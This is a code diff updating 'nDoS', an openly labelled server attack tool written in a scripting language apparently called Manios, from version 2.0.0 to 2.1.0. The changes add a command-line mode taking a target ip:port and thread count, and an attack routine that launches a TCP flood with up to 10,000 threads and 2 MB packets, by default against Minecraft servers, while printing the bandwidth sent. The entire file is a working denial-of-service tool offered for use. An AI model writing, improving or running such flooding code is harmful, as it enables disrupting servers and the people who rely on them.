@@ -2,56 +2,79 @@
 # nDoS — Manios
 # ============================================================================
 # Author:  IdlerHa
-# Version: 2.0.0
+# Version: 2.1.0
 #
-# Tich hop: nSocks TCP Library + nDoS Attack Tool
+# Usage:
+#   mno nDoS.mno <ip:port> [thread]     (CLI mode — attack ngay)
+#   mno nDoS.mno                        (interactive menu)
 # ============================================================================
 
-# ===================== LOAD NATIVE PLUGIN =====================
 load_ext("/root/.manios/nplugin/nsocks.so")
+load_ext("/root/.manios/nplugin/nargs.so")
 
-# ===================== CẤU HÌNH =====================
 hold PACKET_PER_CONN = 4
 hold DATA_PER_PACKET = 2097152
-
-# ===================== NSOCKS LOADED VIA load_ext ABOVE =====================
-
-# ============================================================================
-# nDoS — Attack Functions
-# ============================================================================
 
 # ===== Logo =====
 craft logo
     yell ""
-    yell "  ▄▄▄▄▄▄      ▄▄                  ▄▄     ▄▄▄   ▄   ▄▄▄▄       ▄▄▄▄▄"
+    yell "          N-DoS"
     yell "  Tool attack server easy."
     yell "  Author: IdlerHa"
     yell ""
 end
 
-# ===== Tấn công Minecraft (dùng tcp_flood built-in, pure Manios) =====
+# ===== Attack function (uses global ip, port, thread_count) =====
+craft atm
+    check thread_count > 10000
+        set thread_count = 10000
+        yell "[!] Max thread count is 10000. Capped to 10000."
+    end
+    check thread_count < 1
+        set thread_count = 1
+    end
+
+    yell ""
+    yell "[+] Attacking " + ip + ":" + str(port) + " with " + str(thread_count) + " threads..."
+    yell "[+] Press Ctrl+C to stop"
+    yell ""
+    tcp_flood_reset_stats()
+    tcp_flood(ip, port, thread_count, DATA_PER_PACKET, PACKET_PER_CONN)
+    hold prev = 0
+    spin while true
+        sleep(1)
+        hold now = tcp_flood_stats()
+        hold delta = now - prev
+        set prev = now
+        hold mb = float(delta) / 1048576.0
+        hold mbps = (float(delta) * 8.0) / 1048576.0
+        yell "[+] Sent " + str(mb) + " MB (" + str(mbps) + " Mbps) to " + ip + ":" + str(port)
+    end
+end
+
+# ===== Interactive attack_minecraft (input()) — attack logic INLINE =====
 craft attack_minecraft
     hold data = input("Input IP:PORT Server: ")
     hold colon_pos = find(data, ":")
     check colon_pos == -1
         yell "Invalid format! Use IP:PORT (e.g. 1.2.3.4:25565)"
-        yell ""
         give none
     end
     hold ip = substr(data, 0, colon_pos)
     hold port_str = substr(data, colon_pos + 1, len(data) - colon_pos - 1)
     check port_str == ""
-        yell "Defaulting to port 25565"
         hold port = 25565
     end
     check port_str != ""
         hold port = int(port_str)
     end
-    hold thread_input = input("Thread count (ex:500): ")
+    hold thread_input = input("Thread count (default 500): ")
     hold thread_count = 500
     check thread_input != ""
         set thread_count = int(thread_input)
     end
+
+    # Validate + launch attack (INLINE — no global dependency)
     check thread_count > 10000
         set thread_count = 10000
         yell "[!] Max thread count is 10000. Capped to 10000."
@@ -129,6 +152,39 @@ craft menu
     end
 end
 
+# ===== ENTRY POINT =====
+hold ip = ""
+hold port = 25565
+hold thread_count = 500
+
+# Check CLI args via nargs plugin
+hold arg_count = nargs_count()
+
+check arg_count > 2
+    # CLI mode: mno nDoS.mno <ip:port> [thread]
+    hold raw_arg = nargs_get(2)
+    hold colon_pos = find(raw_arg, ":")
+    check colon_pos != -1
+        set ip = substr(raw_arg, 0, colon_pos)
+        hold port_str = substr(raw_arg, colon_pos + 1, len(raw_arg) - colon_pos - 1)
+        check port_str != ""
+            set port = int(port_str)
+        end
+    end
+    check ip == ""
+        yell "Invalid format! Use: mno nDoS.mno <ip:port> [thread]"
+        yell "Example: mno nDoS.mno 1.2.3.4:25565 500"
+        halt
+    end
+    check arg_count > 3
+        set thread_count = int(nargs_get(3))
+    end
+    # CLI mode: attack ngay, skip menu
+    logo()
+    atm()
+    halt
+end
+
+# Interactive mode: show menu
 logo()
 menu()
-exit(0)
